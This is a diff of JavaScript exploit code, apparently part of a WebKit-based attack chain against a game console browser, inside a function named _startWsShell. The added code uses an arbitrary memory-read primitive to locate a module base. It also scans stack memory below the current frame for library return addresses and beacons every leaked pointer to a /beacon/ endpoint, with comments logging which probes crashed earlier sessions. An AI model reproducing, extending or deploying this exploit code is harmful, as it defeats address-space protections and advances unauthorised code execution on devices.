@@ -5841,6 +5841,32 @@ function _startWsShell(){
         function LF(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('LC-'+s),false);x.send();}catch(e){}}
         try{
           var cfrL=S.cfr;
+          /* THE REAL LK BASE (chain-derived) - the filter excludes only
+           * [lk, lk+0x200000), NOT the whole 0x8-band: the OTHER 0x8-band
+           * modules (libSceNet, libSceLibcInternal, ...) are the returns
+           * worth keeping. */
+          var lkLo=0n,lkHi=0n;
+          try{
+            var entD=S.absRead(0x10001c8000n,0x100);
+            var trP=0n;
+            for(var eiD=0;eiD<entD.length;eiD++){if(entD[eiD]>=0x10001f0000n&&entD[eiD]<0x1000200000n){trP=entD[eiD];break;}}
+            if(trP!==0n){
+              var trD=S.absRead(trP,0x60);
+              var pt=0n;
+              for(var tiD=0;tiD<trD.length;tiD++){if(trD[tiD]>=0x880000000n&&trD[tiD]<0x900000000n){pt=trD[tiD];break;}}
+              if(pt!==0n){
+                var nd=pt,qq=0n;
+                for(var hp=0;hp<5;hp++){
+                  var pp=S.absRead(nd,0x60);
+                  qq=pp[8];
+                  if((qq&0x3fffn)===0x218n&&qq>0x800000000n)break;
+                  nd=qq-0x38n;
+                }
+                if((qq&0x3fffn)===0x218n){var bb=qq-0x6C218n;if(bb%0x4000n===0n){lkLo=bb;lkHi=bb+0x200000n;}}
+              }
+            }
+          }catch(eD){}
+          LF('0 lk=0x'+lkLo.toString(16));
           var seen={},ptrs=[],bandN=0;
           function band(start,len,tag){
             bandN++;
@@ -5857,7 +5883,7 @@ function _startWsShell(){
                 if(seen[key])continue;
                 var bad=false;
                 if(S.BASE&&(v>=S.BASE&&v<S.BASE+0x8000000n))bad=true;
-                if(v>=0x800000000n&&v<0x880000000n)bad=true;   /* lk band - not foreign */
+                if(lkLo&&(v>=lkLo&&v<lkHi))bad=true;            /* the REAL lk module only */
                 if(S.lowB&&S.jfuTop&&v>=S.lowB&&v<S.jfuTop)bad=true;
                 if(cfrL&&(v>cfrL-0x100000n&&v<cfrL+0x100000n))bad=true;
                 if(v>=0x10001c0000n&&v<0x1000210000n)bad=true;
@@ -5871,10 +5897,40 @@ function _startWsShell(){
            * then the wk band killed the page and the reply took them with it) */
           var cfrL2=cfrL;
           if(cfrL2)band((cfrL2/0x4000n)*0x4000n,0x8000,'stk');
-          /* stk is the money band (live libc return addrs of the XHR chain).
-           * wk/cage are OFF by default now - the wk band KILLED session 149
-           * (a hole in [BASE+0x7000000,+0x400000) this build); enable only
-           * with msg.wk / msg.cage. */
+          /* THE DOWNWARD PROBE (msg.deep): the sync-XHR call chain runs
+           * BELOW cfr (callee side) - its stale frames hold the module
+           * returns (libSceNet / libSceLibcInternal / libc.prx). Each
+           * 0x1000 chunk beacons its values IMMEDIATELY: a death at depth
+           * N banks everything above (and locates the stack frontier -
+           * cfr-0x8000 killed session 148, so the frontier is somewhere
+           * in (0x2220, 0x8000)). Default deep = 6 chunks (0x6000). */
+          if(msg.deep&&cfrL2){
+            var pg=(cfrL2/0x4000n)*0x4000n;
+            var deepN=parseInt(msg.deep)||6;
+            for(var dch=1;dch<=deepN;dch++){
+              var dStart=pg-BigInt(dch*0x1000);
+              LF('D'+dch+' start=0x'+dStart.toString(16));
+              var dws;
+              try{dws=S.absRead(dStart,0x1000);}catch(eD2){LF('D'+dch+' THROW');break;}
+              var dGot=0,dVals=[];
+              for(var dwi=0;dwi<dws.length;dwi++){
+                var v=dws[dwi];
+                if(v<0x100000000n||v>=0x10000000000n)continue;
+                var key2=v.toString(16);
+                if(seen[key2])continue;
+                var bad2=false;
+                if(S.BASE&&(v>=S.BASE&&v<S.BASE+0x8000000n))bad2=true;
+                if(lkLo&&(v>=lkLo&&v<lkHi))bad2=true;
+                if(S.lowB&&S.jfuTop&&v>=S.lowB&&v<S.jfuTop)bad2=true;
+                if(cfrL2&&(v>cfrL2-0x100000n&&v<cfrL2+0x100000n))bad2=true;
+                if(v>=0x10001c0000n&&v<0x1000210000n)bad2=true;
+                if(!bad2){seen[key2]=1;dGot++;dVals.push('0x'+v.toString(16));ptrs.push({v:'0x'+v.toString(16),band:'deep'+dch});}
+              }
+              LF('D'+dch+' n='+dGot+(dGot?(' '+dVals.slice(0,40).join(',')):''));
+            }
+          }
+          /* wk/cage are OFF by default (the wk band killed session 149);
+           * enable only with msg.wk / msg.cage. */
           if(msg.wk&&S.BASE)band(S.BASE+0x7000000n,0x400000,'wk');
           if(msg.cage&&S.lowB){
             var cageEnd=S.lowB+0x100000n;
